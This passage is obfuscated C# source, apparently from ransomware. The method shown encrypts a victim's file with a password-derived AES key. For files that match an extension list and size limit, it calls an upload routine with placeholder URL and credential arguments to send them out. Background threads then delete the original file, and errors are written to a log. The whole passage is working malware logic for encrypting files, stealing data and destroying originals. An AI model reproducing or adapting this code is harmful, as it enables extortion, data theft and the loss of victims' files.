			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(hTIzuvuSCESJp, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (spWsYMjzyqV == "YES")
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(ldxrEKPwhQW, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(ldxrEKPwhQW, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(ldxrEKPwhQW, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (hcwuLFFuBr.Length > 0)
				{
					if (PccLrMHcmQe == "YES")
					{
						FileStream fileStream4 = new FileStream(ldxrEKPwhQW, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in DUqqCtAuioSycsG)
						{
							if (ldxrEKPwhQW.ToLower().EndsWith(item) && WGgfEjujSrGUZq == "YES")
							{
								if (Convert.ToInt32(LSzalKwxGC) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										fRNtfJxgwGHJ.kmufixlgVkgi("URL", "USERNAME", "ACCESO", ldxrEKPwhQW);
									}
									catch
									{
									}
								}
							}
							else if (ldxrEKPwhQW.ToLower().EndsWith(item) && WGgfEjujSrGUZq == "NO")
							{
								try
								{
									fRNtfJxgwGHJ.kmufixlgVkgi("URL", "USERNAME", "ACCESO", ldxrEKPwhQW);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(ldxrEKPwhQW);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (hcwuLFFuBr.EndsWith(".part"))
					{
						File.Move(hcwuLFFuBr, hcwuLFFuBr.Replace(".part", ""));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(hcwuLFFuBr))
							{
								File.Delete(hcwuLFFuBr);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (nmuAfqaGuDVCWu)
			{
				try
				{
					File.AppendAllText(vsTGVFSJmItByidD, "File: " + ldxrEKPwhQW + " - Error while fully writing to file: " + ex2.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
